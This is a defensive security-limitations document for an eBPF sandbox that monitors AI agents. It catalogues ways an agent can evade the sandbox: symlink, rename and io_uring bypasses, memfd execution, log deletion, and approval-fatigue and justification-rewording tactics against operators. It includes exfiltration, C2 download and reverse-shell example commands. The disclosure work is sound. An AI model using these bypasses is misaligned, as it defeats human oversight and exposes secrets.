# Guardian Shell - Security Limitations & Known Bypass Vectors

> **Version:** Phase 7 (Security Hardening - Partial)
> **Last Updated:** 2026-03-18
> **Purpose:** Comprehensive documentation of all known security limitations, bypass techniques, and enforcement gaps in Guardian Shell.

---

## Table of Contents

1. [File Access Security](#1-file-access-security)
   - [1.1 Symlink Attack Vulnerability (CRITICAL)](#11-symlink-attack-vulnerability-critical)
   - [1.2 TOCTOU Race Condition (HIGH)](#12-toctou-race-condition-high)
   - [1.3 Rename / Unlink / Hardlink Bypass (HIGH)](#13-rename--unlink--hardlink-bypass-high)
   - [1.4 io_uring File I/O Bypass (HIGH)](#14-io_uring-file-io-bypass-high)
   - [1.5 Path Truncation at 256 Bytes (MEDIUM)](#15-path-truncation-at-256-bytes-medium)
   - [1.6 Max 256 Rules per BPF Map (MEDIUM)](#16-max-256-rules-per-bpf-map-medium)
   - [1.7 /proc/self/root/ Escape Partially Mitigated (LOW)](#17-procselfroot-escape-partially-mitigated-low)
2. [Command Execution Security](#2-command-execution-security)
   - [2.1 memfd_create + execveat Bypass (MEDIUM-HIGH)](#21-memfd_create--execveat-bypass-medium-high)
   - [2.2 Dynamic Linker Bypass (MEDIUM)](#22-dynamic-linker-bypass-medium)
   - [2.3 Silent LSM Enforcement Fallback (MEDIUM)](#23-silent-lsm-enforcement-fallback-medium)
   - [2.4 Separate PENDING_EXEC_DENY Map Complexity (LOW)](#24-separate-pending_exec_deny-map-complexity-low)
3. [Network Monitoring](#3-network-monitoring)
   - [3.1 Network Enforcement is Log-Only (CRITICAL)](#31-network-enforcement-is-log-only-critical)
   - [3.2 DNS is Completely Unmonitored (MEDIUM)](#32-dns-is-completely-unmonitored-medium)
4. [Approval Workflow & Permission System](#4-approval-workflow--permission-system)
   - [4.1 Fixed 120-Second Timeout (MEDIUM)](#41-fixed-120-second-timeout-medium)
   - [4.2 Permissions Require Dashboard Enabled (MEDIUM)](#42-permissions-require-dashboard-enabled-medium)
   - [4.3 No Anomaly Detection on Approval Patterns (MEDIUM)](#43-no-anomaly-detection-on-approval-patterns-medium)
   - [4.4 Grant Duration Accumulation (MEDIUM)](#44-grant-duration-accumulation-medium)
   - [4.5 Justification Analysis is Easily Bypassed (LOW)](#45-justification-analysis-is-easily-bypassed-low)
5. [Platform & Kernel Dependencies](#5-platform--kernel-dependencies)
   - [5.1 CONFIG_BPF_LSM Required for All Enforcement (MEDIUM)](#51-config_bpf_lsm-required-for-all-enforcement-medium)
   - [5.2 x86_64 Tracepoint Offsets Hardcoded (MEDIUM)](#52-x86_64-tracepoint-offsets-hardcoded-medium)
   - [5.3 openat2 Requires Kernel 5.6+ (LOW)](#53-openat2-requires-kernel-56-low)
6. [Design-Level Issues](#6-design-level-issues)
   - [6.1 Fail-Open on All eBPF Errors (MEDIUM)](#61-fail-open-on-all-ebpf-errors-medium)
   - [6.2 Dashboard Has No Authentication (MEDIUM)](#62-dashboard-has-no-authentication-medium)
   - [6.3 BPF Maps Not Updated on Dashboard Policy Edit (MEDIUM)](#63-bpf-maps-not-updated-on-dashboard-policy-edit-medium)
   - [6.4 SIGHUP Reload Skips Alerting Outputs (LOW)](#64-sighup-reload-skips-alerting-outputs-low)
7. [Severity Summary](#7-severity-summary)

---

## 1. File Access Security

### 1.1 Symlink Attack Vulnerability (CRITICAL)

**Status:** Not fixed
**Affected code:** `guardian-ebpf/src/main.rs` (tracepoint hooks), `guardian/src/config.rs:486-529` (`normalize_path()`)

#### What Happens

Guardian captures the **raw filename** from syscall arguments (the path the process passes to `openat()`). Policy rules are evaluated against this raw path string. Symlinks are **never resolved** — not in the kernel eBPF program and not in userspace.

The `normalize_path()` function in userspace performs only string-level normalization:
- Strips `/proc/self/root/` and `/proc/<pid>/root/` prefixes
- Resolves `..` path components
- Does **not** follow symlinks

#### How an Agent Exploits This

```bash
# Setup: Policy allows /tmp/** and denies /etc/shadow
# The agent creates a symlink in the allowed directory

ln -s /etc/shadow /tmp/innocent_file

# The agent opens the symlink
cat /tmp/innocent_file
```

**What Guardian sees:**

| Step | Component | Path Seen | Decision |
|------|-----------|-----------|----------|
| 1 | `sys_enter_openat` tracepoint | `/tmp/innocent_file` | Matches `/tmp/**` allow rule |
| 2 | Policy evaluation | `/tmp/innocent_file` | ALLOW (no deny match) |
| 3 | Kernel resolves symlink | `/etc/shadow` | (Guardian never sees this) |
| 4 | File content returned | Contents of `/etc/shadow` | Agent reads shadow file |

The agent successfully reads `/etc/shadow` despite it being in the deny list because Guardian only sees the **symlink path**, not the **target path**.

#### Why This Is Critical

- Any agent with write access to an allowed directory (e.g., `/tmp/`) can create symlinks to any denied resource
- This is the **single most impactful bypass** in Guardian Shell
- Real-world security tools (Falco, Tracee) face the same challenge — Falco GitHub issue #1111 documents this

#### Required Fix

Implement LSM `file_open` hook with `bpf_d_path()` (available on Linux 5.11+). This kernel helper resolves the **actual filesystem path** after the kernel has followed all symlinks:

```c
// Pseudocode for the fix (not yet implemented)
SEC("lsm/file_open")
int guardian_file_open_resolved(struct file *file) {
    char buf[256];
    int len = bpf_d_path(&file->f_path, buf, sizeof(buf));
    // Now 'buf' contains the REAL path: /etc/shadow
    // Evaluate policy against resolved path
}
```

---

### 1.2 TOCTOU Race Condition (HIGH)

**Status:** Not fixed (architectural limitation)
**Affected code:** `guardian-ebpf/src/main.rs` (tracepoint + LSM interaction)

#### What Happens

Guardian uses a two-phase enforcement model:

1. **Phase 1 (Tracepoint):** `sys_enter_openat` fires at syscall entry. It reads the filename from **userspace memory**, evaluates policy, and writes the decision to the `PENDING_DENY` BPF map.
2. **Phase 2 (LSM):** `security_file_open` fires later in the same syscall. It checks `PENDING_DENY` and enforces the decision (returns `-EACCES` if denied).

Between Phase 1 and Phase 2, there is a **time window** where the filename pointer could change.

#### How an Agent Exploits This

```
Timeline:
────────────────────────────────────────────────────────

T1: Agent calls openat(AT_FDCWD, "/tmp/safe.txt", O_RDONLY)
    └── sys_enter_openat fires
    └── Reads filename: "/tmp/safe.txt"
    └── Policy: ALLOW
    └── PENDING_DENY[pid_tgid] = 0 (no deny)

T2: (Race window — kernel processing continues)
    └── Filename pointer in userspace could be modified
        via mmap + PROT_WRITE, or shared memory, or
        another thread modifying the buffer

T3: security_file_open fires
    └── Reads PENDING_DENY[pid_tgid] = 0
    └── ALLOWS the open
    └── Kernel actually opens whatever file the
        now-modified pointer references
```

#### Why This Matters

- The tracepoint reads a **userspace pointer** — the kernel hasn't committed to a specific file yet
- The LSM hook doesn't re-read or re-validate the filename
- Multi-threaded agents can exploit this with concurrent memory writes
- This is a well-known class of vulnerability (TOCTOU) in syscall-based security tools

#### Difficulty of Exploitation

This is harder to exploit than symlinks because it requires:
- Precise timing between tracepoint and LSM hooks
- Multi-threaded code to modify userspace memory concurrently
- Knowledge of the kernel's internal scheduling

However, determined attackers (especially LLM agents that can generate exploit code) can achieve this reliably.

---

### 1.3 Rename / Unlink / Hardlink Bypass (HIGH)

**Status:** Not fixed
**Missing hooks:** `security_inode_rename`, `security_inode_unlink`, `security_inode_link`

#### What Happens

Guardian monitors `open`, `openat`, `openat2`, and `execve` syscalls. It does **not** monitor file manipulation operations like rename, unlink, or hardlink creation. An agent can use these to move or duplicate files between policy zones.

#### Bypass Examples

**Rename attack — move denied file to allowed directory:**
```bash
# Policy: allow /tmp/**, deny /etc/shadow
# Agent uses rename() to move the file

import os
os.rename("/etc/shadow", "/tmp/shadow_copy")

# Now read it from the allowed location
cat /tmp/shadow_copy   # ALLOWED by Guardian — path is /tmp/**

# Optionally move it back to cover tracks
os.rename("/tmp/shadow_copy", "/etc/shadow")
```

**Hardlink attack — create same-inode copy in allowed directory:**
```bash
# Hardlinks share the same inode (same file data on disk)
ln /etc/shadow /tmp/shadow_hardlink

# Read via the hardlink — Guardian sees /tmp/shadow_hardlink
cat /tmp/shadow_hardlink   # ALLOWED — matches /tmp/**
```

**Unlink attack — delete Guardian's own resources:**
```bash
# Delete Guardian's config to disrupt policy enforcement
rm /etc/guardian/config.toml

# Delete audit logs to cover tracks
rm /var/log/guardian/audit.db
```

#### Why This Is High Severity

- Rename and hardlink attacks are trivially easy to perform
- No special privileges needed if the agent has write access to both directories
- Hardlinks cannot cross filesystem boundaries, but `/tmp` and `/etc` are often on the same filesystem
- Unlink attacks can destroy Guardian's own operational files

#### Required Fix

Add LSM hooks for inode operations:
- `security_inode_rename` — block renaming of denied files
- `security_inode_unlink` — block deletion of protected files
- `security_inode_link` — block hardlink creation for denied files

---

### 1.4 io_uring File I/O Bypass (HIGH)

**Status:** Not fixed
**Affected kernels:** Linux 5.1+

#### What Happens

`io_uring` is a high-performance async I/O interface that submits operations via ring buffers in shared memory. File operations via `io_uring` **bypass all syscall tracepoints** because they don't go through the normal syscall path.

#### How an Agent Exploits This

```c
// Agent uses io_uring to read a denied file
#include <liburing.h>

struct io_uring ring;
io_uring_queue_init(8, &ring, 0);

// Submit a read operation via the ring buffer
struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_read(sqe, fd, buf, sizeof(buf), 0);
io_uring_submit(&ring);

// The read completes without triggering sys_enter_openat
// Guardian's tracepoints never fire
```

#### What Guardian Sees

Nothing. The `sys_enter_openat` tracepoint does not fire for `io_uring` operations. The `PENDING_DENY` map is never populated. The LSM `file_open` hook may still fire (if `CONFIG_BPF_LSM` is enabled), but Guardian's current LSM hook checks `PENDING_DENY` — which was never set by a tracepoint.

This means: **io_uring operations bypass both monitoring AND enforcement.**

#### Scope

This affects major security tools including Falco, Tracee, and Microsoft Defender for Linux. It is a known gap in syscall-based monitoring.

#### Required Fix

Block `io_uring_setup` via seccomp for monitored cgroups:
```c
// Seccomp filter to block io_uring for agent cgroups
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(io_uring_setup), 0);
```

Alternatively, use `io_uring_register`-based BPF restrictions (Linux 6.0+).

---

### 1.5 Path Truncation at 256 Bytes (MEDIUM)

**Status:** By design (eBPF stack/map size constraints)
**Affected code:** `guardian-ebpf/src/main.rs` (all tracepoint hooks), `guardian-common/src/lib.rs` (`MAX_FILENAME_LEN`)

#### What Happens

eBPF programs have a 512-byte stack limit. The `FileAccessEvent` struct stores filenames in a fixed-size buffer of `MAX_FILENAME_LEN` (256 bytes). When `bpf_probe_read_user_str_bytes` encounters a path longer than 256 bytes, it **silently truncates** the path.

#### How an Agent Exploits This

```bash
# Create a deeply nested directory structure
mkdir -p /tmp/$(python3 -c "print('a/'*60)")

# The full path exceeds 256 bytes
# Guardian sees only the first 256 bytes
# Policy evaluation happens on the truncated path

# Example: a path designed so the first 256 bytes match /tmp/**
# but the full path is actually a symlink or mount to /etc/shadow
```

#### Impact

- Policy is evaluated on an **incomplete path**
- The truncated path may match different rules than the full path would
- Agent can craft paths that appear benign when truncated but access sensitive resources

#### Mitigation

This is an inherent eBPF limitation. Possible workarounds:
- Increase `MAX_FILENAME_LEN` (uses more per-CPU array space)
- Flag truncated paths as suspicious and deny by default
- Use `bpf_d_path()` in LSM hooks (not subject to userspace truncation)

---

### 1.6 Max 256 Rules per BPF Map (MEDIUM)

**Status:** By design
**Affected code:** `guardian-ebpf/src/main.rs:69-85`

#### What Happens

BPF maps have a fixed maximum entry count set at load time:

```rust
#[map]
static DENY_PREFIXES: LpmTrie<[u8; MAX_FILENAME_LEN], u8> =
    LpmTrie::with_max_entries(256, 0);

#[map]
static ALLOW_PREFIXES: LpmTrie<[u8; MAX_FILENAME_LEN], u8> =
    LpmTrie::with_max_entries(256, 0);
```

Each agent shares these maps, so 256 is the **total** limit across all rules for all agents.

#### Impact

Complex policies with many specific deny rules may exceed the limit. Any rule beyond entry 256 is silently dropped — the agent can access those paths.

---

### 1.7 /proc/self/root/ Escape Partially Mitigated (LOW)

**Status:** Partially fixed in Phase 7
**Affected code:** `guardian/src/config.rs:486-529`

#### What Was Fixed

The `normalize_path()` function strips container-escape prefixes:

```rust
// Before normalization: /proc/self/root/etc/shadow
// After normalization:  /etc/shadow
// Policy correctly evaluates against /etc/shadow
```

#### What Remains

- Normalization happens **only in userspace** event processing
- eBPF kernel-side policy still sees the raw path
- Combined with symlinks: `/proc/self/root/tmp/link-to-shadow` → strips prefix → `/tmp/link-to-shadow` → but symlink target (`/etc/shadow`) not resolved

---

## 2. Command Execution Security

### 2.1 memfd_create + execveat Bypass (MEDIUM-HIGH)

**Status:** Not fixed
**Affected code:** `guardian-ebpf/src/main.rs` (exec hooks)

#### What Happens

Linux provides `memfd_create()` to create anonymous in-memory files. Combined with `execveat()`, an agent can execute arbitrary code **without any file path visible** to Guardian.

#### How an Agent Exploits This

```c
#include <sys/mman.h>
#include <unistd.h>
#include <linux/memfd.h>

int main() {
    // Step 1: Create anonymous in-memory file
    int fd = memfd_create("", MFD_CLOEXEC);

    // Step 2: Write executable content into it
    // (agent downloads malicious binary into memory)
    unsigned char elf_binary[] = { /* ELF bytes */ };
    write(fd, elf_binary, sizeof(elf_binary));

    // Step 3: Execute directly from the file descriptor
    // No filesystem path ever created
    execveat(fd, "", NULL, NULL, AT_EMPTY_PATH);

    return 0;
}
```

#### What Guardian Sees

| Component | Path Seen |
|-----------|-----------|
| `sys_enter_execve` tracepoint | Does not fire (agent uses `execveat`, not `execve`) |
| `bprm_check_security` LSM | Sees `/memfd:` pseudo-path |
| Current exec policy | No rule matches `/memfd:*` → **ALLOWED** |

#### Impact

- Agent can download and execute **any binary** without touching the filesystem
- No file path to match against policy rules
- The binary never exists on disk, leaving minimal forensic evidence

#### Required Fix

Add `/memfd:*` to the default deny list in exec policy:
```toml
[agents.exec]
deny = ["/memfd:*"]
```

Also add a `sys_enter_execveat` tracepoint hook to catch `execveat()` calls.

---

### 2.2 Dynamic Linker Bypass (MEDIUM)

**Status:** Not fixed
**Affected code:** `guardian-ebpf/src/main.rs` (exec hooks)

#### What Happens

Linux executables are normally loaded by the dynamic linker (`ld-linux-x86-64.so.2`). When an agent runs a command normally, the `bprm_check_security` LSM hook sees the target binary path. But the agent can **invoke the dynamic linker directly**, making LSM see only the linker path.

#### How an Agent Exploits This

```bash
# Normal execution — Guardian blocks this
/usr/bin/curl https://evil.com/exfiltrate?data=secret
# bprm_check_security sees: /usr/bin/curl → DENIED

# Dynamic linker bypass — Guardian allows this
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/curl https://evil.com/exfiltrate?data=secret
# bprm_check_security sees: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 → ALLOWED
# curl executes successfully
```

#### Why This Works

- The kernel's `execve` path reports the **first binary loaded**: the linker
- The linker then loads the target binary (`curl`) in userspace
- Guardian's exec policy checks only the top-level binary
- Dynamic linkers are typically in allowed paths (`/lib/**`, `/usr/lib/**`)

#### Required Fix

Maintain a BPF map of known dynamic linker paths. When `bprm_check_security` sees a linker, inspect the first argument (the actual binary being loaded) and evaluate policy against that instead.

---

### 2.3 Silent LSM Enforcement Fallback (MEDIUM)

**Status:** By design
**Affected code:** `guardian/src/main.rs:286-293`

#### What Happens

Both file and exec enforcement require `CONFIG_BPF_LSM=y` in the kernel and `bpf` in the LSM list. If these aren't available, Guardian **silently falls back to monitor-only mode**:

```rust
// From guardian/src/main.rs
if let Err(e) = load_lsm(&mut bpf, "guardian_enforce", "file_open") {
    warn!(
        "Failed to load LSM file_open: {}. File enforcement unavailable, monitoring only.",
        e
    );
    // Daemon continues running — no enforcement
}

if let Err(e) = load_lsm(&mut bpf, "guardian_enforce_exec", "bprm_check_security") {
    warn!(
        "Failed to load LSM bprm_check_security: {}. Exec enforcement unavailable.",
        e
    );
    // Daemon continues running — no enforcement
}
```

#### Impact

| What the operator expects | What actually happens |
|--------------------------|----------------------|
| File access to `/etc/shadow` blocked | File access logged but **allowed** |
| Exec of `/usr/bin/curl` blocked | Exec logged but **allowed** |
| Config says `mode = "enforce"` | Mode is effectively `"monitor"` |

The warning appears once in daemon logs at startup. If the operator doesn't check logs, they may believe enforcement is active when it is not.

#### Recommendation

- Check for LSM support at startup and exit with an error if `mode = "enforce"` but LSM is unavailable
- Or add a health-check endpoint that reports enforcement status
- Dashboard should prominently show whether enforcement is active or degraded

---

### 2.4 Separate PENDING_EXEC_DENY Map Complexity (LOW)

**Status:** By design
**Affected code:** `guardian-ebpf/src/main.rs:61-138`

#### Why Two Maps Exist

During `execve`, the kernel internally opens the binary file, which triggers the `file_open` LSM hook. If exec enforcement shared the `PENDING_DENY` map with file enforcement:

1. `sys_enter_execve` sets `PENDING_DENY[pid] = 1` (deny exec)
2. Kernel opens the binary → `file_open` LSM fires → reads and **consumes** `PENDING_DENY[pid]`
3. `bprm_check_security` LSM fires → `PENDING_DENY[pid]` already consumed → exec **allowed**

So a separate `PENDING_EXEC_DENY` map is used. This is correct but adds implementation complexity and potential for bugs if the two maps get out of sync.

---

## 3. Network Monitoring

### 3.1 Network Enforcement is Log-Only (CRITICAL)

**Status:** Not implemented
**Affected code:** `guardian-ebpf/src/main.rs:618-693`

#### What Happens

The `sys_enter_connect` tracepoint captures outbound connection attempts and parses `AF_INET` (IPv4) and `AF_INET6` (IPv6) socket addresses. However, it **always returns 0** (success), meaning connections are never blocked:

```rust
// From guardian-ebpf/src/main.rs
fn try_guardian_net_connect(ctx: &TracePointContext) -> Result<u32, i64> {
    // ... parse address family, IP, port ...

    // Log the event
    NET_EVENTS.output(ctx, event, 0);

    // ALWAYS allow — no enforcement
    Ok(0)
}
```

#### What This Means

| Agent Action | Guardian Response |
|-------------|-------------------|
| `curl https://evil.com/exfiltrate?data=$(cat /etc/passwd)` | Logged. Connection succeeds. |
| `wget https://c2-server.com/payload -O /tmp/malware` | Logged. Download succeeds. |
| `python3 -c "import socket; s=socket.socket(); s.connect(('evil.com', 443)); s.send(secret_data)"` | Logged. Data exfiltrated. |
| Reverse shell: `bash -i >& /dev/tcp/attacker.com/4444 0>&1` | Logged. Shell connected. |

An agent can freely communicate with any external server. The network policy in `config.toml` is evaluated in **userspace only** and produces log entries — no kernel-level blocking occurs.

#### Required Fix

Implement `cgroup/connect4` and `cgroup/connect6` BPF programs that can return `0` (block) or `1` (allow) based on destination IP and port. This requires attaching BPF programs to the agent's cgroup.

---

### 3.2 DNS is Completely Unmonitored (MEDIUM)

**Status:** Not implemented

#### What Happens

Guardian monitors at the TCP/IP level (`connect()` syscall). DNS resolution happens **before** `connect()`:

```
Agent code: requests.get("https://evil.com/exfiltrate")

Timeline:
1. DNS query for evil.com  →  Guardian sees nothing
2. DNS response: 1.2.3.4   →  Guardian sees nothing
3. connect(1.2.3.4:443)    →  Guardian logs IP 1.2.3.4
4. TLS handshake            →  Guardian sees nothing
5. HTTP request             →  Guardian sees nothing
```

Guardian logs the IP address but has no way to associate it with a domain name. An agent using IP addresses directly is even harder to attribute.

#### Impact

- No domain-based policy (e.g., "deny *.evil.com") is possible
- IP-only logging makes forensic analysis harder
- Dynamic IPs (CDNs, cloud services) make IP-based blocking impractical

---

## 4. Approval Workflow & Permission System

### 4.1 Fixed 120-Second Timeout (MEDIUM)

**Status:** By design
**Affected code:** `guardian-common/src/lib.rs:115`

```rust
pub const PERMISSION_TIMEOUT_SECS: u64 = 120;
```

#### Impact

Every permission request — regardless of risk level, resource sensitivity, or agent — gets exactly 120 seconds before auto-deny:

| Scenario | Appropriate Timeout | Actual Timeout |
|----------|-------------------|----------------|
| Low-risk: read `/tmp/data.json` | 30s | 120s |
| Critical: read `/etc/shadow` | 10s (shorter = safer) | 120s |
| Operator is in a meeting | 300s+ | 120s (auto-denied) |
| Batch of 5 requests | 600s total | 120s each (first may expire before operator reaches last) |

---

### 4.2 Permissions Require Dashboard Enabled (MEDIUM)

**Status:** By design
**Affected code:** `guardian/src/main.rs:335-412`

#### What Happens

When the dashboard is disabled (`dashboard.enabled = false`), the IPC state has no `permission_bus`. Permission requests are broadcast to a nonexistent channel and auto-denied after 120 seconds.

```
Agent → guardian-ctl request-permission → daemon IPC → permission_bus: None
                                                        → no one can approve
                                                        → 120s timeout
                                                        → AUTO-DENIED
```

#### Impact

- CLI-only deployments (no dashboard) cannot use interactive permissions at all
- No `guardian-ctl approve` command exists as an alternative
- Agents are forced to operate within pre-configured static policy only

---

### 4.3 No Anomaly Detection on Approval Patterns (MEDIUM)

**Status:** Not implemented

#### What's Missing

The SQLite audit trail (`permission_audit` table) records every approval and denial, but no background process analyzes this data. The following patterns go undetected:

| Pattern | Description | Risk |
|---------|-------------|------|
| Rubber-stamping | Operator approves >90% of requests in 24h | Approval fatigue attack |
| Persistence | Agent denied 5+ times, then approved for same resource | Social engineering |
| Flood | Agent submits >20 requests in 1 hour | Resource exhaustion |
| Escalation | Agent requests increasingly sensitive resources | Privilege escalation probe |
| Off-hours | Approvals at 3 AM when operator is likely asleep | Compromised dashboard session |

---

### 4.4 Grant Duration Accumulation (MEDIUM)

**Status:** Not addressed

#### How an Agent Exploits This

Rate limiting applies to **request creation** (3/min, 15/hr). But there is no limit on **total accumulated grant time** for a resource:

```
T=0:00   Agent requests /etc/shadow → DENIED (risk: critical)
T=0:30   Agent requests /etc/shadow → DENIED (cooldown active)
T=1:30   Agent requests /etc/shadow → Operator APPROVES for 1 hour
         (Agent now has access until T=61:30)

T=3:00   Agent requests /etc/shadow again → Operator APPROVES for 1 hour
         (Access extended to T=63:00)

T=5:00   Agent requests again → Approved again
         ...

Result: Agent accumulates continuous access by spacing requests
```

#### Impact

A patient agent can maintain permanent access to a denied resource by requesting renewals before each grant expires, as long as the operator keeps approving.

---

### 4.5 Justification Analysis is Easily Bypassed (LOW)

**Status:** By design (simple pattern matching)
**Affected code:** `guardian/src/permissions.rs:326-365`

#### How It Works

Justification text is checked against hardcoded English substring patterns:

```rust
// Urgency patterns
if lower.contains("urgent") || lower.contains("immediately") || lower.contains("asap") { ... }

// Authority claims
if lower.contains("admin told") || lower.contains("manager said") { ... }

// Security bypass language
if lower.contains("trust me") || lower.contains("override") { ... }
```

#### How an Agent Bypasses This

| Detection Pattern | Bypass |
|-------------------|--------|
| `"urgent"` | `"time-sensitive"`, `"ur gent"`, `"pressing matter"` |
| `"trust me"` | `"you can rely on this"`, `"I assure you"` |
| `"admin told"` | `"per leadership direction"`, `"authorized by ops"` |
| `"override"` | `"bypass the restriction"` (not in pattern list) |
| English patterns only | Use any non-English language |

Additionally, all suspicious patterns result in the **same** risk bump (+1 tier), regardless of how many flags are triggered:

```rust
pub fn justification_risk_bump(findings: &[(String, String)]) -> bool {
    !findings.is_empty()  // 1 flag = same bump as 5 flags
}
```

---

## 5. Platform & Kernel Dependencies

### 5.1 CONFIG_BPF_LSM Required for All Enforcement (MEDIUM)

**Status:** Kernel requirement
**Affected features:** File blocking, exec blocking

Both file access enforcement (`security_file_open`) and exec enforcement (`bprm_check_security`) require:

1. `CONFIG_BPF_LSM=y` in kernel config
2. `bpf` in the LSM list (e.g., `lsm=lockdown,capability,bpf`)

**How to check:**
```bash
# Check kernel config
cat /boot/config-$(uname -r) | grep CONFIG_BPF_LSM
# Should show: CONFIG_BPF_LSM=y

# Check LSM list
cat /sys/kernel/security/lsm
# Should include: ...bpf...
```

Without this, Guardian operates in **monitor-only mode** regardless of the `mode = "enforce"` setting.

---

### 5.2 x86_64 Tracepoint Offsets Hardcoded (MEDIUM)

**Status:** Not portable
**Affected code:** `guardian-ebpf/src/main.rs` (all tracepoint hooks)

Tracepoint argument offsets are hardcoded for x86_64:

```rust
// sys_enter_openat on x86_64:
let filename_ptr: u64 = unsafe { ctx.read_at(24)? };  // offset 24
let flags: i32 = unsafe { ctx.read_at(32)? };          // offset 32

// sys_enter_execve on x86_64:
let filename_ptr: u64 = unsafe { ctx.read_at(16)? };   // offset 16
```

On **aarch64**, **arm**, or **ppc64**, these offsets are different. Running Guardian on non-x86_64 will read **wrong values** from tracepoint arguments, causing:
- Wrong filenames captured
- Wrong flags interpreted
- Potential false allows/denies
- Possible kernel panics (reading garbage pointers)

**How to verify offsets for your architecture:**
```bash
cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_openat/format
```

---

### 5.3 openat2 Requires Kernel 5.6+ (LOW)

**Status:** Gracefully handled
**Affected code:** `guardian/src/main.rs:170-172, 229-234`

On kernels older than 5.6, the `sys_enter_openat2` tracepoint doesn't exist. Guardian handles this gracefully:

```rust
let has_openat2 = load_tracepoint(&mut bpf, "guardian_file_openat2").is_ok();
if !has_openat2 {
    warn!("openat2 tracepoint not available (kernel < 5.6?)");
}
```

**Impact:** On older kernels, an agent using `openat2()` (directly via syscall) bypasses all monitoring and enforcement. This is low severity because `openat2` usage is rare in practice.

---

## 6. Design-Level Issues

### 6.1 Fail-Open on All eBPF Errors (MEDIUM)

**Status:** By design
**Affected code:** Every eBPF hook in `guardian-ebpf/src/main.rs`

Every eBPF program follows the same error-handling pattern:

```rust
#[tracepoint]
pub fn guardian_file_open(ctx: TracePointContext) -> u32 {
    match try_guardian_file_open(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,  // ANY error → return 0 → ALLOW
    }
}

#[lsm]
pub fn guardian_enforce(ctx: LsmContext) -> i32 {
    match try_guardian_enforce(&ctx) {
        Ok(ret) => ret,
        Err(_) => 0,  // ANY error → return 0 → ALLOW
    }
}
```

**What triggers errors:**
- BPF map lookup failure (corrupted map, full map)
- Per-CPU array allocation failure (memory pressure)
- Userspace pointer read failure (`bpf_probe_read_user_str_bytes`)
- Integer overflow or bounds check failure

**Impact:** Under memory pressure or during deliberate map corruption, **all enforcement silently stops**. The system "fails open" — every access is allowed.

**Rationale:** This is intentional to prevent Guardian from crashing the host system. eBPF programs that return errors can cause system instability. However, it means an attacker who can cause eBPF errors effectively disables Guardian.

---

### 6.2 Dashboard Has No Authentication (MEDIUM)

**Status:** Known gap
**Default config:** Binds to `127.0.0.1:8080`

The dashboard has **zero access control**. Anyone who can reach the dashboard port can:

| Action | Impact |
|--------|--------|
| Approve pending permission requests | Grant agents access to denied resources |
| Deny pending requests | Disrupt agent workflows |
| Modify agent policies | Weaken security rules |
| Stop agents | Kill monitored processes |
| View event stream | Information disclosure |
| View audit trail | Information disclosure |

**Default mitigation:** Binding to `127.0.0.1` limits access to localhost. But:
- Port forwarding (SSH, kubectl) exposes it
- Containers sharing the network namespace can access it
- Local privilege escalation gives dashboard access

**Recommendation:** Deploy behind a reverse proxy (nginx, Caddy) with authentication for any non-local access.

---

### 6.3 BPF Maps Not Updated on Dashboard Policy Edit (MEDIUM)

**Status:** Known gap

When an operator edits policy through the dashboard:

1. New policy saved to `config.toml` on disk
2. Userspace `config` struct updated
3. **BPF maps NOT updated** — kernel still enforces old rules

The agent operates under **stale kernel-side policy** until the daemon is restarted or receives `SIGHUP`.

**Dangerous scenario:**
```
1. Operator adds /etc/shadow to deny list via dashboard
2. Operator believes /etc/shadow is now blocked
3. BPF maps still have old rules — /etc/shadow still ALLOWED in kernel
4. Agent reads /etc/shadow successfully
```

---

### 6.4 SIGHUP Reload Skips Alerting Outputs (LOW)

**Status:** Known gap

When `SIGHUP` is sent to the daemon:
- Agent policies: reloaded
- File/exec rules: reloaded and BPF maps updated
- Permission thresholds: reloaded
- **Alerting outputs: NOT reloaded** (webhook URLs, Slack channels, email settings)

Changing alerting configuration requires a full daemon restart.

---

## 7. Severity Summary

### By Category

| Category | CRITICAL | HIGH | MEDIUM-HIGH | MEDIUM | LOW |
|----------|----------|------|-------------|--------|-----|
| File Access | 1 | 3 | — | 2 | 1 |
| Exec | — | — | 1 | 2 | 1 |
| Network | 1 | — | — | 1 | — |
| Approval | — | — | — | 4 | 1 |
| Platform | — | — | — | 2 | 1 |
| Design | — | — | — | 3 | 1 |
| **Total** | **2** | **3** | **1** | **14** | **5** |

### Critical & High Issues at a Glance

| # | Issue | Severity | Category | Exploitable By |
|---|-------|----------|----------|----------------|
| 1 | Symlink attacks bypass all path-based policy | CRITICAL | File Access | Any agent with write access to allowed dir |
| 2 | Network monitoring has zero enforcement | CRITICAL | Network | Any agent making outbound connections |
| 3 | TOCTOU race between tracepoint and LSM | HIGH | File Access | Multi-threaded agent with precise timing |
| 4 | Rename/unlink/hardlink moves files between zones | HIGH | File Access | Any agent with filesystem permissions |
| 5 | io_uring bypasses all syscall monitoring | HIGH | File Access | Agent using io_uring API |
| 6 | memfd_create + execveat runs code without path | MEDIUM-HIGH | Exec | Agent generating in-memory executables |

### Recommended Prioritization

1. **Implement `bpf_d_path()` in LSM hooks** — fixes symlink attacks (highest impact)
2. **Add `cgroup/connect4` network enforcement** — enables connection blocking
3. **Add inode LSM hooks** — prevents rename/hardlink/unlink bypasses
4. **Block io_uring via seccomp** — closes ring buffer blind spot
5. **Add `/memfd:*` to default exec deny** — quick fix for memfd bypass
6. **Add dynamic linker detection** — prevents exec policy evasion
